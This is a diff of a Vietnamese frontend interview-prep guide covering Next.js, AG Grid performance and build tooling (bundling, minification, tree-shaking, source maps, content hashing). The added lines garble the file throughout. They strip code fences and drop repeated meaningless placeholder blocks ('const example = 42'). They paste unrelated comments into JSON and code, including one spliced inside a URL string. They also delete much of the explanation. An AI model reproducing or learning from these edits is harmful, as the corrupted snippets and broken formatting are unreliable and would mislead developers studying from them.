-- **Streaming SSR**: `<Suspense>` cho progressive rendering, TTFB nhanh hơn
-- **Middleware**: Chạy Edge Runtime, dùng cho auth, redirects, A/B testing
-
-
-
-**⚡ Quick Summary:**
-> Next.js 14 = App Router stable + Server Actions + Turbopack. Next.js 15 = React 19 + Async Request APIs + Partial Prerendering. Next.js 16 = Cache cải tiến + Improved DX. Workflow: Page/Layout → Rendering (SSR/SSG/ISR) → Data Fetching → Deployment.
-
-**💡 Ghi Nhớ:**
-- 📁 **Next.js 14**: App Router production-ready, Server Actions, Turbopack dev (beta)
-- 🚀 **Next.js 15**: React 19, Async Request APIs (cookies/headers), Partial Prerendering
-- ⚡ **Next.js 16**: Cache behavior changes, Better DX, Performance improvements
-- 🎯 **Workflow**: Routing → Rendering Strategy → Data Fetching → Build → Deploy
-
----
----
-## 32. 📊 Q32: AG Grid - Enterprise Data Grid: Performance, Real-time Updates & Best Practices  
-
-**P1: Tên câu hỏi:** 📊 Q32: AG Grid - Enterprise Data Grid: Performance, Real-time Updates & Best Practices  
-
-**P2: Trả lời (Senior):**
-
-## **⭐ TÓM TẮT CHO PHỎNG VẤN SENIOR/STAFF**
-
-### **🎯 Câu Trả Lời Ngắn Gọn (2-3 phút):**
-
-**"AG Grid = data grid doanh nghiệp với virtual scrolling, transaction API, cập nhật thời gian thực cho 100K+ hàng.**
-
-**🚀 Top 3 Tối Ưu Hiệu Năng:**
-1. **`getRowId`**: Cung cấp ID hàng ổn định → tra cứu O(1) (nhanh hơn 1000 lần so với mặc định). 
-   ```ts
+ts
    getRowId: (params) => params.data.id // Chú giải: Phải unique & stable!
-   ```
-2. **`applyTransactionAsync`**: Gộp cập nhật → giảm 80% re-renders.
-   ```ts
+
+```js
+// Ví dụ rút gọn
+const example = 42;
+```
+
+ts
    gridRef.current.api.applyTransactionAsync({ update: rows });
-   ```
-3. **Virtual Scrolling**: Chỉ render hàng hiển thị (DOM ảo → cực nhẹ).
 
-**♻️ Cập Nhật Thời Gian Thực (WebSocket):**
-- **Luồng**: Tin nhắn WebSocket → cập nhật state cục bộ → `applyTransactionAsync` → AG Grid cập nhật tăng dần.
-- **Batching**: Gộp 100 updates/100ms → 1 transaction thay vì 100 re-renders.
-- **Tính bất biến**: Tạo objects mới cho updates → React phát hiện thay đổi đúng.
+```js
+// Ví dụ rút gọn
+const example = 42;
+```
 
-**🔑 Khái Niệm Cốt Lõi:**
-- **Row Data vs Transaction API**:
-  - `setRowData`: Re-render toàn bộ (chậm) → chỉ dùng tải ban đầu.
-  - `applyTransaction`: Cập nhật tăng dần (nhanh) → dùng cho thời gian thực.
-- **Column Definitions**: `useMemo` → ngăn tạo lại mỗi render.
-- **Cell Renderers**: Components tùy chỉnh → định dạng cells (icons, buttons, charts).
-- **Server-side Row Model**: Tải dữ liệu lười từ server → cuộn vô hạn.
-
-**⚠️ Lỗi Thường Gặp:**
-- **Không dùng getRowId**: Tạo ID mặc định chậm hơn 1000 lần.
-- **Dùng forEach với applyTransaction**: Gọi 100 lần thay vì 1 batch.
-- **Dữ liệu có thể thay đổi**: Sửa object trực tiếp → AG Grid không phát hiện thay đổi.
-- **Tạo lại columnDefs**: Không useMemo → grid khởi tạo lại mỗi render.
-
-**💡 Kiến Thức Senior:**
-- **Hiệu năng**: AG Grid xử lý 100K hàng mượt (vs MUI DataGrid lag ở 10K).
-- **Kích thước Bundle**: ~150KB gzipped → đánh đổi cho tính năng.
-- **Enterprise vs Community**: Enterprise có pivoting, grouping, excel export ($999/dev/năm).
-- **So sánh**: AG Grid > MUI DataGrid (hiệu năng), React Table (linh hoạt nhưng làm thủ công).
-- **Trường hợp**: Nền tảng trading, dashboards quản trị, công cụ phân tích (datasets lớn + thời gian thực).
-
----
-
-**⚡ Quick Summary:**
-> AG Grid = Enterprise data grid cho high-frequency updates. getRowId (O(1)) + applyTransactionAsync (batching) + Virtual scrolling = xử lý 100K+ rows mượt mà.
-
-**💡 Ghi Nhớ:**
-- 🚀 **Top 3 Performance**: getRowId, applyTransactionAsync, Virtual scrolling
-- ⚡ **Real-time**: WebSocket → applyTransactionAsync (batch updates)
-- 🎯 **Must-Have**: getRowId (1000x faster), immutable data, useMemo columnDefs
-- ⚠️ **Never**: setRowData cho updates, mutable data, forEach async
-
----
----
-## 33. 🏗️ Q33: Frontend Tooling & Build Optimization - Bundling, Minify, Tree-shaking, Code Splitting, Polyfill, Transpiling, ESLint/Prettier, Source Maps  
-
-**P1: Tên câu hỏi:** 🏗️ Q33: Frontend Tooling & Build Optimization - Bundling, Minify, Tree-shaking, Code Splitting, Polyfill, Transpiling, ESLint/Prettier, Source Maps  
-
-**P2: Trả lời (Senior):**
-
-## **⭐ TÓM TẮT CHO PHỎNG VẤN SENIOR/STAFF**
-
-### **🎯 Câu Trả Lời Ngắn Gọn (4-5 phút):**
-
-**"Build tools optimize frontend: Bundling (gộp files), Minify (nén), Tree-shaking (loại unused code), Code splitting (lazy load), Polyfill (old browsers support), Transpiling (modern → old JS), ESLint/Prettier (code quality), Source maps (debugging)."**
-
-**🔑 8 Kỹ Thuật Chính:**
-
-**1. Bundling (Webpack, Vite, Rollup):**
-- Gộp nhiều files thành 1-2 bundles → giảm HTTP requests
-- Resolve dependencies, handle imports/exports
-- Ví dụ: 100 files → 1 `bundle.js` (10 requests → 1 request)
-
-**2. Minification:**
-- Xóa whitespace, shorten variable names, remove comments
-- **Terser** (JS), **cssnano** (CSS) - giảm 40-60% file size
-- `const myVariableName = 123` → `const a=123`
-
-**3. Tree-shaking:**
-- **Loại unused exports** - chỉ bundle code thực sự dùng
-- Cần ES modules (`import/export`), không work với CommonJS
-- Ví dụ: `import {add} from 'utils'` → chỉ bundle `add`, không bundle `subtract`
-
-**4. Code Splitting:**
-- Tách code thành nhiều chunks, **lazy load** khi cần
-- Route-based: mỗi route 1 bundle riêng
-- Dynamic imports: `const module = await import('./heavy.js')`
-
-**5. Polyfills:**
-- Thêm **missing features** cho old browsers (IE11, Safari cũ)
-- Core-js, Babel polyfills - support Promise, async/await, Array.includes...
-- **Differential serving**: modern bundle (ESM) + legacy bundle (polyfilled)
-
-**6. Transpiling (Babel, SWC):**
-- Convert **modern JS → old JS** (ES2022 → ES5)
-- JSX → JS, TypeScript → JS
-- `const arrow = () => {}` → `var arrow = function() {}`
-
-**7. ESLint/Prettier:**
-- **ESLint**: Find bugs, enforce code patterns (unused vars, no-console...)
-- **Prettier**: Auto-format code (spacing, quotes, semicolons)
-- Pre-commit hooks (Husky) để enforce
-
-**8. Source Maps:**
-- Map minified code → original source cho debugging
-- DevTools show **original code** thay vì minified
-- Types: `inline`, `hidden`, `eval` (dev), `source-map` (production)
-
-**⚠️ Lỗi Thường Gặp:**
-- Ship polyfills cho modern browsers → waste bandwidth (dùng differential serving)
-- Không tree-shake → bundle lodash toàn bộ (570KB) thay vì 1 function
-- Source maps trong production → expose source code (dùng `hidden-source-map`)
-- Over-splitting code → quá nhiều requests, worse than bundling
-
-**💡 Kiến Thức Senior:**
-- **Vite** nhanh hơn Webpack vì: ESBuild (Go) transpile, native ESM trong dev (không bundle)
-- **Module Federation** (Webpack 5): Share code giữa apps runtime (microfrontends)
-- **Turbopack** (Next.js 14): Rust-based, 700x faster than Webpack dev mode
-- Performance budget: Set limits (JS < 200KB, CSS < 50KB), fail build nếu vượt
-
-
-
-
-**❓ Câu Hỏi:**
-
-Giải thích chi tiết các công cụ và kỹ thuật tối ưu hóa trong frontend development: Bundling (gộp file), Minify (nén code), Tree-shaking (loại bỏ code thừa), Code splitting (tách code), Polyfill (thêm features cho old browsers), Transpiling (convert modern → old JS), ESLint/Prettier, và Source Maps. Bao gồm cách hoạt động, ưu nhược điểm, và ứng dụng thực tế.
-
-
-
-**📚 Phần 1: Bundling (Gộp File) - Từ Nhiều Files → 1 File**
-
-#### **💡 Bundling Là Gì? (What is Bundling?)**
-
-**Bundling** là quá trình **gộp nhiều files JavaScript/CSS/assets** thành **ít files hơn** (thường là 1 file duy nhất) để gửi lên browser.
-
-**🔥 Tại Sao Cần Bundling?**
-
-```typescript
+typescript
  // Chú giải: ===================================================
 // ❌ KHÔNG DÙNG BUNDLING - Website có 100 files
  // Chú giải: ===================================================
@@ -15872,11 +8557,12 @@ Giải thích chi tiết các công cụ và kỹ thuật tối ưu hóa trong f
  // Chú giải: ✅ 1 HTTP request → NHANH HƠN 100x!
 // ✅ Latency: 1 file × 100ms = 100ms (vs 10 giây)
 // ✅ Có thể optimize (minify, compress, cache)
+
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
-**🎯 Cách Hoạt Động Của Bundler:**
-
-```
 ┌──────────────────────────────────────────────────────────┐
 │               BUNDLING PROCESS (QUY TRÌNH GỘP FILE)      │
 ├──────────────────────────────────────────────────────────┤
@@ -15936,11 +8622,13 @@ Giải thích chi tiết các công cụ và kỹ thuật tối ưu hóa trong f
 │  ✅ Giảm 73% kích thước!                                │
 │  ✅ Giảm từ 5 HTTP requests → 1 request!               │
 └──────────────────────────────────────────────────────────┘
+
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
-**💻 Code Example - Trước và Sau Bundling:**
-
-```typescript
+typescript
  // Chú giải: ===================================================
 // 📁 TRƯỚC BUNDLING - Nhiều files riêng biệt
  // Chú giải: ===================================================
@@ -15986,7 +8674,7 @@ main();
     add: function(a, b) { return a + b; },
     subtract: function(a, b) { return a - b; }
   };
-  
+
  // Chú giải: Module: api.js
   const api = {
     fetchData: async function() {
@@ -15995,33 +8683,27 @@ main();
       return utils.add(data.count, 10);
     }
   };
-  
+
  // Chú giải: Module: index.js (Entry)
   async function main() {
     const result = await api.fetchData();
     const final = utils.subtract(result, 5);
     console.log(final);
   }
-  
+
   main();
 })();
 
  // Chú giải: ✅ Tất cả code trong 1 file!
 // ✅ Modules được wrap trong function scope (tránh global pollution)
 // ✅ Dependencies được resolve (utils, api, index)
+
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
----
-
-**📚 Phần 2: Minify (Nén Code) - Làm Code Nhỏ Gọn**
-
-#### **💡 Minify Là Gì? (What is Minification?)**
-
-**Minify** là quá trình **loại bỏ tất cả ký tự không cần thiết** khỏi code (whitespace, comments, newlines) và **rút ngắn tên biến** để giảm kích thước file.
-
-**🔥 Minify Làm Gì?**
-
-```typescript
+typescript
  // Chú giải: ===================================================
 // 📝 TRƯỚC MINIFY - Code dễ đọc (10 KB)
  // Chú giải: ===================================================
@@ -16030,19 +8712,19 @@ main();
 function calculateTotalPrice(items, taxRate, discount) {
   // Calculate subtotal - Tính tổng tiền hàng
   let subtotal = 0;
-  
+
   for (let i = 0; i < items.length; i++) {
     const item = items[i];
     subtotal += item.price * item.quantity;
   }
-  
+
   // Apply discount - Áp dụng giảm giá
   const discountedPrice = subtotal * (1 - discount / 100);
-  
+
   // Add tax - Thêm thuế
   const tax = discountedPrice * (taxRate / 100);
   const total = discountedPrice + tax;
-  
+
   return total;
 }
 
@@ -16072,11 +8754,13 @@ function c(a,b,d){let e=0;for(let f=0;f<a.length;f++){const g=a[f];e+=g.price*g.
 // ✅ Remove unnecessary semicolons, braces → Tiết kiệm ~50 bytes
 //
 // 📊 KẾT QUẢ: 10 KB → 3 KB (Giảm 70%!)
+
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
-**🔧 Các Kỹ Thuật Minify Chi Tiết:**
-
-```typescript
+typescript
  // Chú giải: ===================================================
 // 🔧 KỸ THUẬT 1: Remove Whitespace & Comments
  // Chú giải: ===================================================
@@ -16183,11 +8867,12 @@ const user = {
 
 // ⚠️ NGUY HIỂM: Nếu external code access user.firstName → BỊ LỖI!
 // → Chỉ dùng khi chắc chắn property KHÔNG được access từ bên ngoài
+
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
-**📊 Minify Performance Impact:**
-
-```
 ┌──────────────────────────────────────────────────────────┐
 │           MINIFY IMPACT (Ảnh hưởng của Minify)          │
 ├──────────────────────────────────────────────────────────┤
@@ -16216,19 +8901,13 @@ const user = {
 │                                                          │
 │  📈 Cải thiện: Nhanh hơn 8.5x!                          │
 └──────────────────────────────────────────────────────────┘
+
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
----
-
-**📚 Phần 3: Tree Shaking (Loại Bỏ Code Thừa) - Rũ Cây**
-
-#### **💡 Tree Shaking Là Gì?**
-
-**Tree Shaking** là quá trình **loại bỏ dead code** (code không được sử dụng) khỏi bundle. Tên gọi "rũ cây" vì giống như rũ cây để lá chết rơi xuống.
-
-**🌲 Cách Hoạt Động:**
-
-```typescript
+typescript
  // Chú giải: ===================================================
 // 📦 LIBRARY: math-utils.js (Thư viện toán học)
  // Chú giải: ===================================================
@@ -16302,11 +8981,12 @@ console.log(result1, result2);
  // Chú giải: Bundle size: ~400 bytes
 
 // 📊 Giảm 80% kích thước! 🚀
+
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
-**🔍 Tree Shaking Deep Dive - Phân Tích Chi Tiết:**
-
-```
 ┌──────────────────────────────────────────────────────────┐
 │         TREE SHAKING PROCESS (Quy trình rũ cây)          │
 ├──────────────────────────────────────────────────────────┤
@@ -16342,11 +9022,13 @@ console.log(result1, result2);
 │  ✅ OUTPUT: Optimized bundle (Bundle tối ưu)           │
 │  └── Chỉ chứa code THỰC SỰ được dùng                   │
 └──────────────────────────────────────────────────────────┘
+
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
-**⚠️ Điều Kiện Để Tree Shaking Hoạt Động:**
-
-```typescript
+typescript
  // Chú giải: ===================================================
 // ✅ YÊU CẦU 1: Dùng ES Modules (import/export)
  // Chú giải: ===================================================
@@ -16459,11 +9141,13 @@ import { funcA } from './index.js'; // Chú giải: Import từ barrel
 // ✅ GOOD: Import trực tiếp
 import { funcA } from './moduleA.js';
 // ✅ Chỉ load moduleA, không load B và C
+
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
-**🎯 Real-World Tree Shaking Example:**
-
-```typescript
+typescript
  // Chú giải: ===================================================
 // 📦 VÍ DỤ THỰC TẾ: Lodash Library
  // Chú giải: ===================================================
@@ -16487,34 +9171,12 @@ const result = uniq([1, 2, 2, 3]);
 // ✅ BETTER: Dùng lodash-es (ES Modules version)
 import { uniq } from 'lodash-es';
 // → Tree shaking tự động loại bỏ functions không dùng
+
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
----
-
-**📚 Phần 4: Code Splitting, ESLint/Prettier, Source Maps**
-
-Các công cụ quan trọng trong frontend development:
-
-1. **ESLint/Prettier** - Code Quality & Formatting
-
-   - **ESLint**: Linter - phát hiện lỗi, enforce coding standards
-   - **Prettier**: Formatter - format code tự động, giữ style nhất quán
-   - **Tích hợp**: ESLint check logic + Prettier format code
-
-2. **Source Maps** - Debugging
-
-   - Map từ minified/transpiled code → original source code
-   - Debug trong browser như code gốc (trước build)
-   - Xem line numbers, variable names chính xác
-
-3. **Code Splitting** - Performance Optimization
-   - Chia bundle thành nhiều chunks nhỏ
-   - Load code khi cần (lazy loading)
-   - Cải thiện initial load time
-
-**Hoạt động:**
-
-```
 ┌─────────────────────────────────────────────────────────────┐
 │              COMPLETE TOOLING WORKFLOW                      │
 ├─────────────────────────────────────────────────────────────┤
@@ -16596,91 +9258,13 @@ Các công cụ quan trọng trong frontend development:
 │  - Legacy: 100 KB (ES5, polyfills, split) - 80% smaller  │
 │  - Initial load: 30 KB main.js - 94% smaller! 🚀         │
 └─────────────────────────────────────────────────────────────┘
+
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
-**Ưu điểm:**
-
-- ✅ **Bundling**: 100 requests → 1 request, giảm latency 100x
-- ✅ **Minify**: Giảm 60-70% kích thước file (850KB → 280KB)
-- ✅ **Tree-shaking**: Loại bỏ dead code, giảm 30-50% bundle size
-- ✅ **Polyfill**: Dùng modern features trên old browsers (IE11)
-- ✅ **Transpiling**: Viết ES2020+, deploy ES5 (backward compatible)
-- ✅ **ESLint**: Catch bugs sớm, enforce best practices
-- ✅ **Prettier**: Không tranh cãi về code style, tự động format
-- ✅ **Source Maps**: Debug dễ dàng như development mode
-- ✅ **Code Splitting**: Initial load nhanh hơn, better UX
-- ✅ **Differential Serving**: Modern browsers tải 66% ít hơn
-
-**Nhược điểm:**
-
-- ❌ **Bundling**: Build time chậm hơn (phải gộp files)
-- ❌ **Minify**: Code khó đọc (cần source maps để debug)
-- ❌ **Tree-shaking**: Không hoạt động với CommonJS, side-effects
-- ❌ **Polyfill**: Tăng bundle size (core-js ~90KB nếu import all)
-- ❌ **Transpiling**: Code dài hơn (arrow fn → function declaration)
-- ❌ **ESLint**: Cấu hình phức tạp, rules conflict
-- ❌ **Prettier**: Đôi khi format không như ý muốn
-- ❌ **Source Maps**: File .map tăng bandwidth (nên serve riêng)
-- ❌ **Code Splitting**: Phức tạp hơn, nhiều HTTP requests
-
-**Chú thích:**
-
-**📦 Bundling Best Practices:**
-
-- **Webpack**: Bundler phổ biến nhất, nhiều features
-- **Vite**: Bundler mới, cực nhanh (dùng esbuild)
-- **Rollup**: Tốt cho libraries (tree-shaking xuất sắc)
-
-**🗜️ Minify Tools:**
-
-- **Terser**: Minifier tốt nhất cho JavaScript (default trong Webpack 5)
-- **esbuild**: Cực nhanh (Golang), dùng trong Vite
-- **UglifyJS**: Cũ hơn, chậm hơn (deprecated)
-
-**🌲 Tree-shaking Tips:**
-
-- **Yêu cầu**: ESM (`import/export`), không dùng CommonJS (`require`)
-- **`sideEffects: false`**: Báo cho bundler biết "safe to remove unused exports"
-- **Side-effects**: Code có tác dụng phụ (global variables, CSS imports, polyfills...)
-
-**🔧 Polyfill Best Practices:**
-
-- **core-js**: Comprehensive polyfill library (500+ polyfills)
-- **polyfill.io**: Dynamic polyfill service (auto-detect browser)
-- **Strategy**: Import only needed polyfills (`import 'core-js/features/array/includes'`)
-- **Avoid**: Import all polyfills (`import 'core-js'` → +90KB!)
-
-**🔄 Transpiling Best Practices:**
-
-- **Babel**: Industry standard transpiler (ES6+ → ES5)
-- **@babel/preset-env**: Auto-detect transforms needed based on targets
-- **TypeScript**: Type checking + transpiling (slower than Babel)
-- **Best**: TypeScript (type check) + Babel (transpile)
-- **Differential Serving**: Modern bundle (ES2020) + Legacy bundle (ES5)
-
-**🔍 ESLint vs Prettier:**
-
-- **ESLint**: Tập trung vào **logic** (unused vars, missing return, potential bugs...)
-- **Prettier**: Tập trung vào **formatting** (spaces, quotes, line breaks...)
-- **Tích hợp**: `eslint-config-prettier` tắt ESLint formatting rules → không conflict
-
-**🗺️ Source Maps:**
-
-- Development: `devtool: 'eval-source-map'` (fast rebuild)
-- Production: `devtool: 'source-map'` (separate .map file)
-- **Hidden source maps**: Deploy .map riêng, không public → bảo mật source code
-
-**✂️ Code Splitting:**
-
-- **Route-based**: Split theo routes (React Router, Vue Router)
-- **Component-based**: Lazy load components nặng (React.lazy, Vue defineAsyncComponent)
-- **Vendor splitting**: Tách libraries (React, Lodash...) ra vendor chunk
-
----
-
-**Code Example (TypeScript):**
-
-```typescript
+typescript
  // Chú giải: ============================================
  // Chú giải: 1. ESLint + Prettier Configuration
  // Chú giải: ============================================
@@ -16940,10 +9524,10 @@ module.exports = {
 
 /**
  * 🔐 CONTENT HASHING LÀ GÌ? (What is Content Hashing?)
- * 
+ *
  * Content Hashing là kỹ thuật thêm HASH (chuỗi ký tự duy nhất) vào tên file
  * dựa trên NỘI DUNG của file. Khi nội dung thay đổi → hash thay đổi → tên file mới.
- * 
+ *
  * 🎯 MỤC ĐÍCH:
  * ✅ Cache Busting: Bắt buộc browser tải file mới khi code thay đổi
  * ✅ Long-term Caching: Cache files không đổi vô thời hạn (1 năm)
@@ -17051,7 +9635,7 @@ module.exports = {
 
 /**
  * QUY TRÌNH TẠO HASH:
- * 
+ *
  * 1. Bundler đọc NỘI DUNG file (main.js)
  * 2. Chạy hashing algorithm (MD5, SHA-256, etc.) trên nội dung
  * 3. Tạo hash string (VD: a3f8b2c1d5e9f7a2)
@@ -17087,11 +9671,11 @@ const newFileName = `main.${hash}.js`; // Chú giải: "main.a3f8b2c1.js"
  * 1️⃣ [contenthash] - RECOMMENDED (Khuyên dùng)
  *    Hash dựa trên NỘI DUNG file
  *    → File không đổi → hash không đổi → cache hiệu quả
- * 
+ *
  * 2️⃣ [chunkhash]
  *    Hash dựa trên CHUNK (group of modules)
  *    → Modules trong cùng chunk share hash
- * 
+ *
  * 3️⃣ [hash] (fullhash)
  *    Hash dựa trên TOÀN BỘ build
  *    → Build mới → TẤT CẢ files đổi hash (không tối ưu)
@@ -17101,25 +9685,25 @@ const newFileName = `main.${hash}.js`; // Chú giải: "main.a3f8b2c1.js"
 module.exports = {
   output: {
     path: path.resolve(__dirname, 'dist'),
-    
+
  // Chú giải: ✅ RECOMMENDED: [contenthash] - hash theo nội dung
     filename: '[name].[contenthash:8].js',
  // Chú giải: ↑            ↑
     //             name chunk    8 ký tự hash
-    
+
  // Chú giải: Output: main.a3f8b2c1.js, vendor.9d4e7f1a.js
-    
+
  // Chú giải: Alternative strategies:
  // Chú giải: filename: '[name].[chunkhash:8].js',  // Hash theo chunk
     // filename: '[name].[fullhash:8].js',   // Hash toàn bộ build (không khuyên)
   },
-  
+
   optimization: {
  // Chú giải: ⚠️ QUAN TRỌNG: moduleIds: 'deterministic'
     // → Đảm bảo module IDs không đổi giữa các builds
     // → vendor.js hash KHÔNG đổi nếu code không đổi
     moduleIds: 'deterministic',
-    
+
     splitChunks: {
       chunks: 'all',
       cacheGroups: {
@@ -17155,12 +9739,12 @@ export default defineConfig({
 
 /**
  * 🏢 SCENARIO: E-commerce Website
- * 
+ *
  * BEFORE Content Hashing:
  * ❌ Deploy version mới → Users vẫn thấy version cũ (cached)
  * ❌ Phải đợi cache expire (1 tuần) hoặc user hard refresh
  * ❌ Bug fix không đến users ngay lập tức
- * 
+ *
  * AFTER Content Hashing:
  * ✅ Deploy version mới → Users TỰ ĐỘNG thấy version mới
  * ✅ Vendor files (React, libraries) cached vô thời hạn
@@ -17218,14 +9802,14 @@ export default defineConfig({
 server {
   location / {
     root /var/www/html;
-    
+
     # ⚠️ index.html: KHÔNG cache (luôn fresh)
     location = /index.html {
       add_header Cache-Control "no-cache, no-store, must-revalidate";
       add_header Pragma "no-cache";
       add_header Expires "0";
     }
-    
+
     # ✅ Hashed files: Cache vô thời hạn (1 năm)
     location ~* \.(js|css|png|jpg|jpeg|gif|svg|woff|woff2|ttf|eot)$ {
       # Nếu file có hash trong tên (VD: main.a3f8b2c1.js)
@@ -17296,7 +9880,7 @@ module.exports = {
  * 4. Dùng moduleIds: 'deterministic' (Webpack)
  * 5. Split vendor code (React, libraries) ra riêng
  * 6. Tên file: [name].[contenthash:8].js (8 ký tự hash)
- * 
+ *
  * ❌ DON'T (KHÔNG NÊN):
  * 1. Dùng [hash] (fullhash) → tất cả files đổi hash
  * 2. Cache index.html → users không thấy version mới
@@ -17310,13 +9894,13 @@ module.exports = {
 
 /**
  * 🎯 REAL APP EXAMPLE (Ứng dụng thực tế):
- * 
+ *
  * WITHOUT Content Hashing:
  * ├── Build #1: Users download 1.2 MB
  * ├── Build #2 (1 tuần sau): Users download 1.2 MB (lại!) ❌
  * ├── Build #3 (1 tuần sau): Users download 1.2 MB (lại!) ❌
  * └── Total: 3.6 MB trong 3 tuần
- * 
+ *
  * WITH Content Hashing:
  * ├── Build #1: Users download 1.2 MB
  * │   ├── main.js: 200 KB
@@ -17334,7 +9918,7 @@ module.exports = {
  * │   └── styles.css: 150 KB (changed - hash mới)
  * │
  * └── Total: 1.57 MB trong 3 tuần
- * 
+ *
  * 📊 Bandwidth Saved: 2.03 MB (56% nhỏ hơn!) 🚀
  * ⚡ Load Time: Nhanh hơn 3-5x (từ cache)
  */
@@ -17384,28 +9968,28 @@ optimization: {
 
 /**
  * 🔐 CONTENT HASHING:
- * 
+ *
  * ✅ LÀ GÌ?
  *    - Thêm hash vào tên file dựa trên nội dung
  *    - File thay đổi → hash mới → tên file mới
- * 
+ *
  * ✅ HOẠT ĐỘNG SAO?
  *    1. Bundler hash nội dung file (MD5/SHA-256)
  *    2. Tạo string hash (a3f8b2c1)
  *    3. Rename: main.js → main.a3f8b2c1.js
  *    4. Update index.html với tên mới
- * 
+ *
  * ✅ DÙNG ĐỂ LÀM GÌ?
  *    - Cache Busting: Users luôn thấy version mới
  *    - Long-term Caching: Cache files không đổi vô thời hạn
  *    - Performance: Chỉ download files đã thay đổi
  *    - Bandwidth Saving: Tiết kiệm 50-80% bandwidth
- * 
+ *
  * ✅ KHI NÀO DÙNG?
  *    - LUÔN LUÔN dùng cho production builds!
  *    - Kết hợp với vendor splitting
  *    - Kết hợp với aggressive caching (1 năm)
- * 
+ *
  * ✅ CÔNG CỤ:
  *    - Webpack: output.filename = '[name].[contenthash:8].js'
  *    - Vite: Tự động enable
@@ -17519,15 +10103,13 @@ export default function Analytics() {
 // - Initial load: 50KB + 150KB = 200KB (thay vì 825KB)
 // - User vào /analytics → Load thêm charts.js (500KB) khi cần
  // Chú giải: - Faster initial render, better UX
+
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
----
-
-**Best Practices:**
-
-1. **ESLint + Prettier**
-
-   ```bash
+bash
    # Install
    npm install -D eslint prettier eslint-config-prettier
    npm install -D @typescript-eslint/parser @typescript-eslint/eslint-plugin
@@ -17535,42 +10117,26 @@ export default function Analytics() {
    # Run on pre-commit (husky + lint-staged)
    npx husky install
    npx husky add .husky/pre-commit "npx lint-staged"
-   ```
 
-   ```json
+```js
+// Ví dụ rút gọn
+const example = 42;
+```
+
+json
  // Dùng `JSON.parse(JSON.stringify(obj))` là hack sao chép sâu nhưng sẽ mất hàm, `Date`, `undefined`, symbol, v.v.
    {
      "lint-staged": {
        "*.{ts,tsx}": ["eslint --fix", "prettier --write"]
      }
    }
-   ```
 
-2. **Source Maps**
+```js
+// Ví dụ rút gọn
+const example = 42;
+```
 
-   - ✅ Development: `eval-source-map` (fast rebuild)
-   - ✅ Production: `source-map` hoặc `hidden-source-map`
-   - ✅ Deploy .map files riêng (không public) → bảo mật
-   - ✅ Set `sourceMapFilename` để serve từ CDN riêng
-
-3. **Tree-shaking**
-
-   - ✅ Dùng ESM (`import/export`), KHÔNG dùng CommonJS
-   - ✅ Set `sideEffects: false` trong package.json
-   - ✅ Named exports thay vì default exports
-   - ✅ Import trực tiếp, tránh barrel exports (`index.ts`)
-   - ✅ Check bundle size: `npm run build -- --analyze`
-
-4. **Code Splitting**
-
-   - ✅ Route-based splitting (React Router, Next.js pages)
-   - ✅ Component-based splitting (lazy load heavy components)
-   - ✅ Vendor splitting (separate React, libraries...)
-   - ✅ Set `Suspense` fallback cho UX tốt
-   - ✅ Prefetch critical chunks: `<link rel="prefetch">`
-
-5. **TypeScript Strict Mode**
-   ```json
+json
  // Dùng `JSON.parse(JSON.stringify(obj))` là hack sao chép sâu nhưng sẽ mất hàm, `Date`, `undefined`, symbol, v.v.
    {
      "compilerOptions": {
@@ -17580,15 +10146,13 @@ export default function Analytics() {
        "noFallthroughCasesInSwitch": true // Chú giải: Switch case phải break
      }
    }
-   ```
 
----
+```js
+// Ví dụ rút gọn
+const example = 42;
+```
 
-**Common Mistakes:**
-
-1. **❌ ESLint + Prettier Conflict**
-
-   ```typescript
+typescript
  // Chú giải: ❌ BAD: ESLint format rules conflict với Prettier
    // .eslintrc.js (KHÔNG dùng indent, quotes rules)
    {
@@ -17602,11 +10166,13 @@ export default function Analytics() {
    {
      extends: ['prettier'] // Tắt format rules
    }
-   ```
 
-2. **❌ Source Maps trong Production**
+```js
+// Ví dụ rút gọn
+const example = 42;
+```
 
-   ```typescript
+typescript
  // Chú giải: ❌ BAD: Public source maps → leak source code
  // Chú giải: webpack.config.js
    {
@@ -17621,11 +10187,13 @@ export default function Analytics() {
        publicPath: 'https: // Trường private (ví dụ `#field`) chỉ truy cập được trong class, không thể truy cập từ bên ngoài.
      }
    }
-   ```
 
-3. **❌ Tree-shaking Không Hoạt động**
+```js
+// Ví dụ rút gọn
+const example = 42;
+```
 
-   ```typescript
+typescript
    // ❌ BAD: CommonJS → tree-shaking KHÔNG work
    const utils = require('./utils'); // Chú giải: CommonJS
 
@@ -17643,11 +10211,13 @@ export default function Analytics() {
      return a + b;
    }
    import { add } from './utils'; // Chú giải: Chỉ bundle add()
-   ```
 
-4. **❌ Code Splitting Quá Nhiều**
+```js
+// Ví dụ rút gọn
+const example = 42;
+```
 
-   ```typescript
+typescript
    // ❌ BAD: Split quá nhỏ → nhiều HTTP requests
    const Button = lazy(() => import('./Button')); // ❌ Component nhỏ không nên split
    const Icon = lazy(() => import('./Icon')); // ❌ Quá nhỏ
@@ -17655,11 +10225,13 @@ export default function Analytics() {
    // ✅ GOOD: Chỉ split components/routes nặng
    const Dashboard = lazy(() => import('./pages/Dashboard')); // ✅ Page nặng
    const ChartLibrary = lazy(() => import('./ChartLibrary')); // ✅ Library nặng (500KB+)
-   ```
 
-5. **❌ Path Alias Phá Tree-shaking**
+```js
+// Ví dụ rút gọn
+const example = 42;
+```
 
-   ```typescript
+typescript
  // Dùng `JSON.parse(JSON.stringify(obj))` là hack sao chép sâu nhưng sẽ mất hàm, `Date`, `undefined`, symbol, v.v.
    {
      "paths": {
@@ -17673,11 +10245,13 @@ export default function Analytics() {
 
    // ✅ GOOD: Import trực tiếp
    import { add } from '@utils/math'; // → import trực tiếp
-   ```
 
-6. **❌ Quên Set `sideEffects`**
+```js
+// Ví dụ rút gọn
+const example = 42;
+```
 
-   ```json
+json
    // ❌ BAD: Không set sideEffects
  // Dùng `JSON.parse(JSON.stringify(obj))` là hack sao chép sâu nhưng sẽ mất hàm, `Date`, `undefined`, symbol, v.v.
